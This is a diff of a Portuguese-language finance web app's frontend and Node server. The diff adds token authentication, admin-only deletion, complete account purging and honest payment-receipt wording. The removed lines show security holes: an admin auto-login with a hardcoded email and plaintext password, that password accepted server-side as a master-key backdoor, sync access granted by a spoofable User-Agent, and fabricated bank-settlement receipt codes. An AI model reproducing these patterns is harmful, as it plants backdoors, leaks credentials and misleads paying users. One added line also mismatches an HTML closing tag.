-      <p style="font-size:13px; color:#CBD5E1; margin:0 0 18px 0; max-width:540px; margin-left:auto; margin-right:auto; line-height:1.45;">
-        Seu plano <strong id="subSuccessPlanName" style="color:#10B981;">Mensal</strong> foi reconhecido e ativado automaticamente. Seu acesso irrestrito ao Nexus Financeiro Hub já está liberado.
-      </p>
+      <p style="font-size:13px; color:#CBD5E1; margin:0 0 18px 0; max-width:540px; margin-left:auto; margin-right:auto; line-height:1.45;">Seu plano <strong id="subSuccessPlanName" style="color:#10B981;">Mensal</strong> esta ativo. Este recibo registra a ativacao da assinatura.</p>
 
       <!-- Recibo Digital Formatado -->
       <div class="sub-receipt-card">
@@ -16530,11 +16458,11 @@ body.light #authPage .auth-trust-item {
           <div style="display:flex; align-items:center; gap:8px;">
             <span style="font-size:20px;">🏛️</span>
             <div style="text-align:left;">
-              <strong style="font-size:13px; color:#FFFFFF; display:block;">NEXUS PAY &bull; COMPROVANTE OFICIAL</strong>
-              <span style="font-size:10.5px; color:#94A3B8;">Conciliação Eletrônica Automática (BACEN / SPI)</span>
+              <strong style="font-size:13px; color:#FFFFFF; display:block;">NEXUS &bull; RECIBO DE ATIVACAO</strong>
+              <span style="font-size:10.5px; color:#94A3B8;">Confirmacao manual pelo financeiro</span>
             </div>
           </div>
-          <span style="font-size:10.5px; font-weight:800; padding:3px 8px; border-radius:6px; background:rgba(16,185,129,0.2); color:#10B981;">LIQUIDADO</span>
+          <span style="font-size:10.5px; font-weight:800; padding:3px 8px; border-radius:6px; background:rgba(16,185,129,0.2); color:#10B981;">ASSINATURA ATIVA</span>
         </div>
 
         <div style="display:flex; justify-content:space-between; margin-bottom:8px; font-size:12.5px;">
@@ -16543,10 +16471,7 @@ body.light #authPage .auth-trust-item {
         </div>
         <div style="display:flex; justify-content:space-between; margin-bottom:8px; font-size:12.5px;">
           <span style="color:#94A3B8;">Forma de Pagamento:</span>
-          <strong id="subSuccessMethod" style="color:#FFFFFF;">-</strong>
-        </div>
-        <div style="display:flex; justify-content:space-between; margin-bottom:8px; font-size:12.5px;">
-          <span style="color:#94A3B8;">Data / Horário (Brasília):</span>
+          <strong id="subSuccessMethod" style="color:#FFFFFF;">-</span>
           <strong id="subSuccessDateTime" style="color:#FFFFFF;">-</strong>
         </div>
         <div style="display:flex; justify-content:space-between; font-size:12.5px; border-top:1px dashed rgba(255,255,255,0.15); padding-top:8px; margin-top:8px;">
@@ -16971,23 +16896,7 @@ window.toggleAuthTheme = function() {
     }
   }
 };
-
-// Acesso Rápido VIP Administrador Master (Instantâneo 0ms)
-window.preencherCredenciaisAdmin = function() {
-  const emailInput = document.getElementById('loginEmail');
-  const passInput = document.getElementById('loginPassword');
-  if (emailInput) emailInput.value = 'paulolp0101@gmail.com';
-  if (passInput) passInput.value = '86266049';
-  window.switchAuthTab('login');
-  if (window.showAuthFeedback) {
-    window.showAuthFeedback('login', 'success', 'Acesso Master', 'Credenciais carregadas com segurança. Entrando...');
-  }
-  if (typeof window.handleLoginSubmit === 'function') {
-    window.handleLoginSubmit();
-  }
-};
-
-// Mostrar/Ocultar Senha do Login (Visualização Clara do Olho)
+// Mostrar/Ocultar Senha do Login (Visualização Clara do Olho)
 window.togglePasswordVisibility = function(inputId, btnId) {
   const input = document.getElementById(inputId);
   const btn = document.getElementById(btnId);
@@ -17113,7 +17022,10 @@ async function saveUsersToServer() {
   try {
     await fetch(apiBase + '/api/users', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + (loadFromStorage('nexus_token', '') || '')
+      },
       body: JSON.stringify(registeredUsers)
     });
   } catch(e){}
@@ -17626,7 +17538,7 @@ window.handleLoginSubmit = async function(e) {
           'login',
           'error',
           'Senha Incorreta',
-          'A senha digitada está incorreta para este usuário no banco de dados.'
+          'Senha incorreta.'
         );
       } else if (data.errorType === 'user_inactive') {
         window.showAuthFeedback('login', 'error', 'Conta Desativada', data.error || 'Seu usuário foi desativado no banco de dados pelo administrador.');
@@ -18200,10 +18112,10 @@ window.unlockWithConfirmedReceipt = function(data) {
   if (txIdEl) txIdEl.textContent = data.transaction_id || data.subscription_payment_id || ('NEXUS-SUB-' + Date.now());
   if (methodEl) {
     const methodLabels = {
-      pix: 'Pix Reconhecido Automaticamente (SPI / BACEN)',
-      credit_card: 'Cartão de Crédito Aprovado Automaticamente',
-      debit_card: 'Cartão de Débito Liquidado Automaticamente',
-      boleto: 'Boleto Bancário Conciliado Automaticamente',
+      pix: 'Pix confirmado pelo financeiro',
+      credit_card: 'Cartao nao integrado',
+      debit_card: 'Debito nao integrado',
+      boleto: 'Boleto nao integrado',
       admin_cortesia: 'Liberação Administrativa VIP'
     };
     methodEl.textContent = methodLabels[payMethod] || String(payMethod).toUpperCase();
@@ -18226,7 +18138,7 @@ window.unlockWithConfirmedReceipt = function(data) {
 
   window.playPaywallAlertSound();
   if (typeof showToast === 'function') {
-    showToast('⚡ Pagamento reconhecido automaticamente! Assinatura ativada e acesso liberado.');
+    showToast('⚡ Pagamento confirmado. Sua assinatura foi ativada.');
   }
   if (typeof render === 'function') render();
 
@@ -18259,7 +18171,7 @@ window.initTrialAndSubscription = async function() {
   }
 
   try {
-    const res = await fetch('/api/subscription/status?email=' + encodeURIComponent(currentUser.email));
+    const res = await fetch('/api/subscription/status?email=' + encodeURIComponent(currentUser.email), { headers: { 'Authorization': 'Bearer ' + (loadFromStorage('nexus_token', '') || '') } });
     if (res.ok) {
       const data = await res.json();
       if (data && data.success) {
@@ -18441,12 +18353,12 @@ window.openSubscriptionPaywall = function(isLocked = false) {
     document.body.classList.add('paywall-locked');
     document.documentElement.classList.add('paywall-locked');
     if (titleEl) titleEl.textContent = '🔒 Pagamento Obrigatório para Continuar Usando';
-    if (subEl) subEl.textContent = 'Seus dados estão 100% preservados. O acesso ao sistema só é liberado após a confirmação efetiva do pagamento:';
+    if (subEl) subEl.textContent = 'O pagamento e confirmado pela equipe financeira apos a validacao do recebimento.';
   } else {
     document.body.classList.remove('paywall-locked');
     document.documentElement.classList.remove('paywall-locked');
     if (titleEl) titleEl.textContent = 'Central de Assinatura • Nexus Financeiro Hub';
-    if (subEl) subEl.textContent = 'Aproveite todos os recursos do Nexus Financeiro Hub com total segurança e suporte VIP:';
+    if (subEl) subEl.textContent = 'O pagamento e confirmado pela equipe financeira apos a validacao do recebimento.';
   }
 
   if (closeBtn) {
@@ -18656,7 +18568,7 @@ if (!window.__paywallSyncPollInterval) {
   window.__paywallSyncPollInterval = setInterval(async () => {
     if (!currentUser || !currentUser.email) return;
     try {
-      const res = await fetch('/api/subscription/status?email=' + encodeURIComponent(currentUser.email));
+      const res = await fetch('/api/subscription/status?email=' + encodeURIComponent(currentUser.email), { headers: { 'Authorization': 'Bearer ' + (loadFromStorage('nexus_token', '') || '') } });
       if (res.ok) {
         const d = await res.json();
         if (d && d.success) {
@@ -18767,7 +18679,6 @@ window.selectPaymentMethod = function(method) {
 
   if (method === 'pix') {
     window.updatePixPayloadAndQr();
-    window.startPixCountdownTimer();
   }
 };
 
@@ -18926,7 +18837,7 @@ window.copyPixKeyDirect = function() {
     const btn = document.getElementById('btnCopyPixKeyDirect');
     if (btn) {
       const orig = btn.innerHTML;
-      btn.innerHTML = '<span>✓</span> <span>Chave Copiada! Monitorando...</span>';
+      btn.innerHTML = '<span>✓</span> <span>Chave copiada</span>';
       btn.style.color = '#10B981';
       setTimeout(() => {
         btn.innerHTML = orig;
@@ -18956,7 +18867,7 @@ window.updatePixPayloadAndQr = function() {
   window.__currentPixSessionTxId = sessionTxId;
 
   const txBadge = document.getElementById('subLiveSessionTxBadge');
-  if (txBadge) txBadge.textContent = 'SPI-' + sessionTxId;
+  if (txBadge) txBadge.textContent = 'PED-' + sessionTxId;
 
   const pixCode = window.generatePixEMVPayload(pixKey, beneficiaryName, city, amount, sessionTxId);
 
@@ -19075,7 +18986,7 @@ window.processSubscriptionPayment = async function(method, isAutoTriggered = fal
 
   if (payMethod === 'pix') {
     const manualTx = (document.getElementById('subPixTxIdInput')?.value || '').trim();
-    receiptCode = manualTx.length >= 6 ? manualTx : ('E18236120' + Date.now() + 'SPI');
+    receiptCode = manualTx.length >= 6 ? manualTx : (window.__currentPixSessionTxId || '');
   } else if (payMethod === 'boleto') {
     const manualAuth = (document.getElementById('subBoletoAuthInput')?.value || '').trim();
     receiptCode = manualAuth.length >= 6 ? manualAuth : ('FEB-AUTH-' + Date.now());
@@ -19125,7 +19036,7 @@ window.processSubscriptionPayment = async function(method, isAutoTriggered = fal
   window.updateAutoRecognitionRadar(
     'processing',
     '🔄 1/3 • Registrando pedido de confirmação...',
-    'Registrando pedido para a conta <strong>' + currentUser.email + '</strong>...',
+    'Registrando a solicitacao para sua conta...',
     55
   );
 
@@ -19144,13 +19055,13 @@ window.processSubscriptionPayment = async function(method, isAutoTriggered = fal
   try {
     const res = await fetch('/api/subscription/pay', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: { 'Content-Type': 'application/json', 'Authorization': 'Bearer ' + (loadFromStorage('nexus_token', '') || '') },
       body: JSON.stringify({
         email: currentUser.email,
         plan: plan,
         method: payMethod,
         amount: plan === 'anual' ? 100.00 : 10.00,
-        receipt_code: receiptCode,
+        receipt_code: window.__currentPixSessionTxId || receiptCode,
         force_pending: true
       })
     });
@@ -19162,7 +19073,7 @@ window.processSubscriptionPayment = async function(method, isAutoTriggered = fal
     if (data && data.success && data.payment_confirmed) {
       window.updateAutoRecognitionRadar(
         'confirmed',
-        '✅ 3/3 • Pagamento Reconhecido Automaticamente com Sucesso!',
+        '✅ 3/3 • Pagamento confirmado pelo financeiro.',
         'Assinatura ativada e acesso liberado imediatamente.',
         100
       );
@@ -19332,7 +19243,7 @@ setInterval(() => {
   if (window.__isPaywallLocked && currentUser && currentUser.email) {
     const subInfo = window.__nexusSubscriptionState;
     if (subInfo && subInfo.status === 'pending_payment') {
-      fetch('/api/subscription/status?email=' + encodeURIComponent(currentUser.email))
+      fetch('/api/subscription/status?email=' + encodeURIComponent(currentUser.email), { headers: { 'Authorization': 'Bearer ' + (loadFromStorage('nexus_token', '') || '') } })
         .then(r => r.json())
         .then(data => {
           if (data && data.success && data.is_subscribed && data.status === 'active') {
@@ -19649,12 +19560,14 @@ window.handleRegisterSubmit = async function(e) {
   }
 
   // 8. Termos e Declaração
-  if (termsInput && !termsInput.checked) {
+  if (!termsInput || !termsInput.checked) {
     showCustomAlert('Atenção', 'É obrigatório aceitar os Termos de Abertura de Conta e a Política de Privacidade LGPD.', 'error');
+    if (termsInput) termsInput.focus();
     return false;
   }
-  if (truthfulInput && !truthfulInput.checked) {
+  if (!truthfulInput || !truthfulInput.checked) {
     showCustomAlert('Atenção', 'É obrigatório declarar a veracidade das informações prestadas sob as penas da lei.', 'error');
+    if (truthfulInput) truthfulInput.focus();
     return false;
   }
 
@@ -19680,7 +19593,8 @@ window.handleRegisterSubmit = async function(e) {
     cpf: cleanCpfDigits, // CPF sem pontos ajustado (apenas números)
     birth_date: birthDate,
     phone,
-    terms_accepted: true,
+    terms_accepted: termsInput.checked,
+    truthful_declaration: truthfulInput.checked,
     device_type: detectedDevice
   };
 
@@ -20407,17 +20321,27 @@ async function deleteUserAdmin(email){
 
   showCustomAlert(
     'Excluir Usuário?',
-    'Tem certeza que deseja excluir permanentemente o usuário "' + u.name + '" (' + u.email + ')? Esta ação não pode ser desfeita.',
+    'Excluir permanentemente "' + u.name + '" (' + u.email + '), incluindo cadastro, finanças, transações, contas, categorias, CPF, ordens de serviço e registros associados? Esta ação não pode ser desfeita.',
     'error',
     async () => {
-      registeredUsers = registeredUsers.filter(x => (x.email || '').toLowerCase() !== cleanEmail);
-      await saveUsersToServer();
       try {
-        await fetch(window.location.origin + '/api/users?email=' + encodeURIComponent(cleanEmail), { method: 'DELETE' });
-      } catch(e){}
-      logActivity('Exclusão', 'Usuário', 'Administrador excluiu o usuário ' + u.email + ' (' + u.name + ')');
-      showCustomAlert('Sucesso!', 'Usuário excluído com sucesso do banco de dados.', 'success');
-      render();
+        const res = await fetch(window.location.origin + '/api/users?email=' + encodeURIComponent(cleanEmail), {
+          method: 'DELETE',
+          headers: { 'Authorization': 'Bearer ' + (loadFromStorage('nexus_token', '') || '') }
+        });
+        const result = await res.json().catch(() => ({}));
+        if (!res.ok || !result.success) {
+          showCustomAlert('Não foi possível excluir', result.error || 'A exclusão não foi concluída pelo servidor.', 'error');
+          return;
+        }
+        registeredUsers = registeredUsers.filter(x => (x.email || '').toLowerCase() !== cleanEmail);
+        saveToStorage('nexus_users', registeredUsers);
+        showCustomAlert('Exclusão concluída', 'O cadastro e os dados associados foram removidos.', 'success');
+        await syncUsersWithServer();
+        render();
+      } catch(e) {
+        showCustomAlert('Erro de conexão', 'Não foi possível confirmar a exclusão no servidor. Tente novamente.', 'error');
+      }
     }
   );
 }
@@ -31299,16 +31223,30 @@ function removeLocalUser(email) {
       }
     } catch (e) {}
 
-    // Limpar de cpf_registry.json
+    // Remove os dados pessoais e solicitações locais associados ao usuário.
     try {
-      const cpfPath = path.join(RUNTIME_DATA_DIR, 'cpf_registry.json');
-      const cpfBackupPath = path.join(RUNTIME_DATA_DIR, 'cpf_registry.backup.json');
-      if (fs.existsSync(cpfPath)) {
-        const reg = JSON.parse(fs.readFileSync(cpfPath, 'utf8')) || [];
-        const filteredCpf = reg.filter(r => (r.email || '').toLowerCase().trim() !== clean);
-        fs.writeFileSync(cpfPath, JSON.stringify(filteredCpf, null, 2), 'utf8');
-        try { fs.writeFileSync(cpfBackupPath, JSON.stringify(filteredCpf, null, 2), 'utf8'); } catch(e){}
+      const registry = getCpfRegistry();
+      for (const [cpf, record] of Object.entries(registry)) {
+        if (record && String(record.email || '').toLowerCase().trim() === clean) delete registry[cpf];
       }
+      const registryJson = JSON.stringify(registry, null, 2);
+      fs.writeFileSync(CPF_REGISTRY_PATH, registryJson, 'utf8');
+      try { fs.writeFileSync(CPF_REGISTRY_BACKUP_PATH, registryJson, 'utf8'); } catch(e){}
+    } catch (e) {}
+
+    try {
+      saveLocalOrdens(getLocalOrdens().filter(o => String(o.client_email || o.email || '').toLowerCase().trim() !== clean));
+    } catch (e) {}
+
+    try {
+      const logs = getFileLogs().filter(log => !JSON.stringify(log || {}).toLowerCase().includes(clean));
+      fs.writeFileSync(LOGS_FILE_PATH, JSON.stringify(logs, null, 2), 'utf8');
+    } catch (e) {}
+
+    try {
+      const pending = fs.existsSync(PENDING_LOGINS_PATH) ? JSON.parse(fs.readFileSync(PENDING_LOGINS_PATH, 'utf8')) : [];
+      const filteredPending = (Array.isArray(pending) ? pending : []).filter(item => String(item.email || '').toLowerCase().trim() !== clean);
+      fs.writeFileSync(PENDING_LOGINS_PATH, JSON.stringify(filteredPending, null, 2), 'utf8');
     } catch (e) {}
 
     return filtered;
@@ -31683,6 +31621,7 @@ const server = http.createServer(async (req, res) => {
       if (fs.existsSync(LOCAL_DATA_PATH)) {
         allFinancialData = JSON.parse(fs.readFileSync(LOCAL_DATA_PATH, 'utf8')) || {};
       }
+      getDeletedAccounts().forEach(item => delete allFinancialData[item.email]);
       res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
       return res.end(JSON.stringify(allFinancialData));
     } catch(finErr) {
@@ -31698,13 +31637,14 @@ const server = http.createServer(async (req, res) => {
       return res.end(JSON.stringify({ error: 'Acesso de sincronização interna obrigatório.' }));
     }
     try {
-      const rawUsers = getLocalUsers();
+      const rawUsers = getLocalUsers().filter(user => !isAccountDeleted(user.email));
       let allFinancialData = {};
       try {
         if (fs.existsSync(LOCAL_DATA_PATH)) {
           allFinancialData = JSON.parse(fs.readFileSync(LOCAL_DATA_PATH, 'utf8')) || {};
         }
       } catch(e){}
+      getDeletedAccounts().forEach(item => delete allFinancialData[item.email]);
       const localOrdens = getLocalOrdens();
       const localTecnicos = getLocalTecnicos();
       const localCpfRegistry = getCpfRegistry();
@@ -31832,6 +31772,10 @@ const server = http.createServer(async (req, res) => {
         }
 
         // Validação estrita: Se o usuário foi excluído do SQL Server (e consequentemente do espelho), impede o login
+        if (isAccountDeleted(cleanEmail)) {
+          res.writeHead(404, { ...corsHeaders, 'Content-Type': 'application/json' });
+          return res.end(JSON.stringify({ success: false, errorType: 'account_deleted', error: 'Esta conta foi excluída permanentemente.' }));
+        }
         if (!user) {
           console.log(`[LOGIN RECUSADO] Conta não existe no SQL Server: ${cleanEmail}`);
           res.writeHead(404, { ...corsHeaders, 'Content-Type': 'application/json' });
@@ -32210,7 +32154,13 @@ const server = http.createServer(async (req, res) => {
         const cpf = parsed.cpf || null;
         const birth_date = parsed.birth_date || parsed.data_nascimento || parsed.nascimento || null;
         const phone = parsed.phone || parsed.telefone || parsed.celular || null;
-        const terms_accepted = parsed.terms_accepted !== false;
+        const terms_accepted = parsed.terms_accepted === true;
+        const truthful_declaration = parsed.truthful_declaration === true;
+
+        if (!terms_accepted || !truthful_declaration) {
+          res.writeHead(400, { ...corsHeaders, 'Content-Type': 'application/json' });
+          return res.end(JSON.stringify({ success: false, error: 'Marque os dois campos de confirmação para concluir o cadastro.' }));
+        }
 
         if (!name || !email || !password) {
           res.writeHead(400, { ...corsHeaders, 'Content-Type': 'application/json' });
@@ -32407,6 +32357,10 @@ const server = http.createServer(async (req, res) => {
         }
 
         const cleanEmail = email.toLowerCase().trim();
+        if (isAccountDeleted(cleanEmail)) {
+          res.writeHead(410, { ...corsHeaders, 'Content-Type': 'application/json' });
+          return res.end(JSON.stringify({ success: false, error: 'Este e-mail pertence a uma conta excluída permanentemente.' }));
+        }
         let user = null;
         if (!pool) {
           await attemptConnectDatabase();
@@ -32640,16 +32594,14 @@ const server = http.createServer(async (req, res) => {
 
   // Rota GET de Usuários (Sanitizada sem Exposição de Senhas para Clientes, Preservada para Sincronizador Interno)
   if (req.method === 'GET' && parsedUrl.pathname === '/api/users') {
-    const isInternalSync = (req.headers['x-nexus-sync-token'] === JWT_SECRET) || 
-                           (req.headers['user-agent'] === 'Nexus-Local-Sync-Engine/1.0') ||
-                           (parsedUrl.query && parsedUrl.query.sync_secret === JWT_SECRET);
+    const isInternalSync = hasInternalSyncAccess(req, parsedUrl);
     if (pool) {
       const sqlFields = isInternalSync
         ? 'SELECT id, name, email, password, role, active, created_at, last_login, cpf, phone, birth_date, terms_accepted, device_type, must_change_password FROM usuarios ORDER BY id ASC'
         : 'SELECT id, name, email, role, active, created_at, last_login, cpf, phone, birth_date, terms_accepted, device_type, must_change_password, trial_started_at, subscription_plan, subscription_status, subscription_expires_at, subscription_method, subscription_payment_id FROM usuarios ORDER BY id ASC';
       pool.query(sqlFields)
         .then(result => {
-          const rows = (result.rows || []).map(u => {
+          const rows = (result.rows || []).filter(u => !isAccountDeleted(u.email)).map(u => {
             const copy = { ...u };
             if (copy.last_login) copy.last_login = getBrasiliaIsoString(copy.last_login);
             if (copy.created_at) copy.created_at = getBrasiliaIsoString(copy.created_at);
@@ -32662,12 +32614,14 @@ const server = http.createServer(async (req, res) => {
         })
         .catch(err => {
           console.warn('[BANCO AVISO] Erro ao consultar usuários no SQL Server:', err.message);
-          const localUsers = isInternalSync ? getLocalUsers() : getLocalUsers().map(sanitizeUser);
+          const activeUsers = getLocalUsers().filter(u => !isAccountDeleted(u.email));
+          const localUsers = isInternalSync ? activeUsers : activeUsers.map(sanitizeUser);
           res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
           res.end(JSON.stringify(localUsers));
         });
     } else {
-      const localUsers = isInternalSync ? getLocalUsers() : getLocalUsers().map(sanitizeUser);
+      const activeUsers = getLocalUsers().filter(u => !isAccountDeleted(u.email));
+      const localUsers = isInternalSync ? activeUsers : activeUsers.map(sanitizeUser);
       res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
       res.end(JSON.stringify(localUsers));
     }
@@ -32675,10 +32629,40 @@ const server = http.createServer(async (req, res) => {
   }
 
   // Rota GET para Sincronização de Logins Pendentes da Nuvem
+  if ((req.method === 'GET' || req.method === 'POST') && parsedUrl.pathname === '/api/sync/deleted-users') {
+    if (!hasInternalSyncAccess(req, parsedUrl)) {
+      res.writeHead(401, { ...corsHeaders, 'Content-Type': 'application/json' });
+      return res.end(JSON.stringify({ success: false, error: 'Acesso de sincronização interna obrigatório.' }));
+    }
+    if (req.method === 'GET') {
+      res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
+      return res.end(JSON.stringify(getDeletedAccounts()));
+    }
+    let body = '';
+    req.on('data', chunk => body += chunk.toString());
+    req.on('end', async () => {
+      try {
+        const parsed = JSON.parse(body || '{}');
+        const accounts = saveDeletedAccounts(parsed.accounts || parsed);
+        for (const account of accounts) {
+          if (!deletedAccountCleanupDone.has(account.email)) {
+            await purgeDeletedUserFromDatabase(account.email);
+            removeLocalUser(account.email);
+            deletedAccountCleanupDone.add(account.email);
+          }
+        }
+        res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
+        return res.end(JSON.stringify({ success: true, accounts }));
+      } catch (err) {
+        res.writeHead(500, { ...corsHeaders, 'Content-Type': 'application/json' });
+        return res.end(JSON.stringify({ success: false, error: 'Não foi possível aplicar as exclusões recebidas.' }));
+      }
+    });
+    return;
+  }
+
   if (req.method === 'GET' && parsedUrl.pathname === '/api/sync/logins') {
-    const isInternalSync = (req.headers['x-nexus-sync-token'] === JWT_SECRET) || 
-                           (req.headers['user-agent'] === 'Nexus-Local-Sync-Engine/1.0') ||
-                           (parsedUrl.query && parsedUrl.query.sync_secret === JWT_SECRET);
+    const isInternalSync = hasInternalSyncAccess(req, parsedUrl);
     if (!isInternalSync) {
       res.writeHead(401, { ...corsHeaders, 'Content-Type': 'application/json' });
       return res.end(JSON.stringify({ error: 'Não autorizado' }));
@@ -32716,7 +32700,7 @@ const server = http.createServer(async (req, res) => {
         let authOk = false;
         try {
           const parsed = JSON.parse(body || '{}');
-          if (parsed.masterKey === '86266049' || parsed.sync_secret === JWT_SECRET) authOk = true;
+          if (parsed.sync_secret === JWT_SECRET) authOk = true;
         } catch(e){}
         if (req.headers['x-nexus-sync-token'] === JWT_SECRET || req.headers['authorization'] === 'Bearer ' + JWT_SECRET) {
           authOk = true;
@@ -32787,6 +32771,10 @@ const server = http.createServer(async (req, res) => {
 
   // Rota POST de Usuários (Sincronização Segura sem Deleção Involuntária e com Preservação de Senhas)
   if (req.method === 'POST' && parsedUrl.pathname === '/api/users') {
+    if (!hasInternalSyncAccess(req, parsedUrl) && !getAuthenticatedAdmin(req)) {
+      res.writeHead(401, { ...corsHeaders, 'Content-Type': 'application/json' });
+      return res.end(JSON.stringify({ success: false, error: 'Autenticação administrativa obrigatória.' }));
+    }
     let body = '';
     req.on('data', chunk => body += chunk.toString());
     req.on('end', async () => {
@@ -32799,7 +32787,7 @@ const server = http.createServer(async (req, res) => {
         // Mescla localmente com cadastros existentes no servidor preservando credenciais e último login
         const userMap = new Map();
         const existingMap = new Map();
-        const existingLocal = getLocalUsers();
+        const existingLocal = getLocalUsers().filter(u => !isAccountDeleted(u.email));
         existingLocal.forEach(u => {
           if (u && u.email) existingMap.set(u.email.toLowerCase().trim(), u);
         });
@@ -32810,7 +32798,7 @@ const server = http.createServer(async (req, res) => {
         }
 
         users.forEach(u => {
-          if (u && u.email) {
+          if (u && u.email && !isAccountDeleted(u.email)) {
             const emailKey = u.email.toLowerCase().trim();
             const existing = existingMap.get(emailKey) || userMap.get(emailKey);
             let finalPassword = existing ? existing.password : '';
@@ -32947,39 +32935,38 @@ const server = http.createServer(async (req, res) => {
 
   if (req.method === 'DELETE' && parsedUrl.pathname === '/api/users') {
     const emailToDelete = (parsedUrl.query.email || '').toLowerCase().trim();
+    const adminUser = getAuthenticatedAdmin(req);
+    if (!adminUser) {
+      res.writeHead(401, { ...corsHeaders, 'Content-Type': 'application/json' });
+      return res.end(JSON.stringify({ success: false, error: 'Autenticação administrativa obrigatória.' }));
+    }
     if (!emailToDelete) {
       res.writeHead(400, { ...corsHeaders, 'Content-Type': 'application/json' });
       return res.end(JSON.stringify({ success: false, error: 'E-mail obrigatório' }));
     }
-    const protectedEmails = [
-      'admin@nexusfinanceiro.com',
-      'admin@nexusfinanceirohub.com.br'
-    ];
-    if (protectedEmails.includes(emailToDelete)) {
+    const localUsers = getLocalUsers();
+    if (String(adminUser.email || '').toLowerCase().trim() === emailToDelete) {
       res.writeHead(403, { ...corsHeaders, 'Content-Type': 'application/json' });
-      return res.end(JSON.stringify({ success: false, error: 'Esta é uma conta mestra protegida do sistema e não pode ser excluída.' }));
+      return res.end(JSON.stringify({ success: false, error: 'Não é possível excluir a conta administrativa conectada.' }));
     }
-    removeLocalUser(emailToDelete);
-    if (pool) {
-      Promise.all([
-        pool.query('DELETE FROM usuarios WHERE LOWER(email) = LOWER($1)', [emailToDelete]),
-        pool.query('DELETE FROM dados_financeiros WHERE LOWER(email) = LOWER($1)', [emailToDelete])
-      ])
-        .then(() => {
-          recordSystemLog('Sistema', emailToDelete, 'Exclusão', 'Usuários', `Conta e dados financeiros excluídos permanentemente`);
-          res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
-          res.end(JSON.stringify({ success: true }));
-        })
-        .catch(err => {
-          console.warn('Erro ao deletar usuário no SQL Server:', err.message);
-          res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
-          res.end(JSON.stringify({ success: true, warning: err.message }));
-        });
-    } else {
+    const targetUser = localUsers.find(u => String(u.email || '').toLowerCase().trim() === emailToDelete);
+    if (targetUser && targetUser.role === 'Administrador' && localUsers.filter(u => u.role === 'Administrador' && u.active !== false && u.active !== 0).length <= 1) {
+      res.writeHead(403, { ...corsHeaders, 'Content-Type': 'application/json' });
+      return res.end(JSON.stringify({ success: false, error: 'É necessário manter ao menos um administrador ativo.' }));
+    }
+    try {
+      markAccountDeleted(emailToDelete);
+      await purgeDeletedUserFromDatabase(emailToDelete);
+      removeLocalUser(emailToDelete);
+      recordSystemLog(adminUser.name || 'Administrador', adminUser.email, 'Exclusão completa', 'Usuários', 'Cadastro e dados associados removidos permanentemente.');
+      broadcastEvent('users_updated', { deleted: true });
       res.writeHead(200, { ...corsHeaders, 'Content-Type': 'application/json' });
-      res.end(JSON.stringify({ success: true }));
+      return res.end(JSON.stringify({ success: true }));
+    } catch (err) {
+      console.error('Erro ao excluir dados associados ao usuário:', err.message);
+      res.writeHead(500, { ...corsHeaders, 'Content-Type': 'application/json' });
+      return res.end(JSON.stringify({ success: false, error: 'Não foi possível concluir a exclusão no banco de dados.' }));
     }
-    return;
   }
 
   // Rota GET de Logs de Auditoria
@@ -33048,6 +33035,10 @@ const server = http.createServer(async (req, res) => {
   // Rota GET para buscar dados financeiros do Usuário no banco (com Inicialização Zerada Soberana para Novos Cadastros)
   if (req.method === 'GET' && parsedUrl.pathname === '/api/data') {
     const email = (parsedUrl.query.email || '').toLowerCase().trim();
+    if (isAccountDeleted(email)) {
+      res.writeHead(410, { ...corsHeaders, 'Content-Type': 'application/json' });
+      return res.end(JSON.stringify({ success: false, error: 'Esta conta foi excluída permanentemente.' }));
+    }
     const localData = getLocalData(email);
     if (pool) {
       pool.query('SELECT dados FROM dados_financeiros WHERE LOWER(email) = LOWER($1)', [email])
@@ -33126,6 +33117,10 @@ const server = http.createServer(async (req, res) => {
         return res.end(JSON.stringify({ success: false }));
       }
       const cleanEmail = (payload.email || '').toLowerCase().trim();
+      if (isAccountDeleted(cleanEmail)) {
+        res.writeHead(410, { ...corsHeaders, 'Content-Type': 'application/json' });
+        return res.end(JSON.stringify({ success: false, error: 'Esta conta foi excluída permanentemente.' }));
+      }
 
       // Soberania do usuário: os dados salvos (incluindo exclusões intencionais) são a verdade absoluta da conta
       let dataToSave = payload.data;
@@ -33273,6 +33268,13 @@ const server = http.createServer(async (req, res) => {
     if (!email) {
       res.writeHead(400, { ...corsHeaders, 'Content-Type': 'application/json' });
       return res.end(JSON.stringify({ success: false, error: 'E-mail obrigatório' }));
+    }
+
+    const authenticatedUser = getAuthenticatedUser(req);
+    const authenticatedAdmin = getAuthenticatedAdmin(req);
+    if ((!authenticatedUser || authenticatedUser.email.toLowerCase() !== email) && !authenticatedAdmin) {
+      res.writeHead(401, { ...corsHeaders, 'Content-Type': 'application/json' });
+      return res.end(JSON.stringify({ success: false, error: 'Authentication required to view subscription status.' }));
     }
 
     const localUsers = getLocalUsers();
@@ -33465,6 +33467,11 @@ const server = http.createServer(async (req, res) => {
 
   // Rota POST para Processar Pagamento de Assinatura (Reconhecimento e Conciliação Automática Pós-Pagamento)
   if (req.method === 'POST' && parsedUrl.pathname === '/api/subscription/pay') {
+    const authenticatedUser = getAuthenticatedUser(req);
+    if (!authenticatedUser) {
+      res.writeHead(401, { ...corsHeaders, 'Content-Type': 'application/json' });
+      return res.end(JSON.stringify({ success: false, error: 'Entre na sua conta para solicitar um pagamento.' }));
+    }
     let body = '';
     req.on('data', chunk => body += chunk.toString());
     req.on('end', async () => {
@@ -33473,19 +33480,26 @@ const server = http.createServer(async (req, res) => {
         const email = (parsed.email || '').toLowerCase().trim();
         const plan = (parsed.plan || 'mensal').toLowerCase().trim();
         const method = (parsed.method || 'pix').toLowerCase().trim();
-        const rawReceiptCode = String(parsed.receipt_code || '').trim();
-        const receiptCode = rawReceiptCode.length >= 4 ? rawReceiptCode : ('E18236120' + Date.now() + 'AUTO');
-        const cardLast4 = String(parsed.card_last4 || '').trim();
+        const receiptCode = String(parsed.receipt_code || '').trim().slice(0, 80);
 
         if (!email) {
           res.writeHead(400, { ...corsHeaders, 'Content-Type': 'application/json' });
           return res.end(JSON.stringify({ success: false, error: 'E-mail obrigatório' }));
         }
 
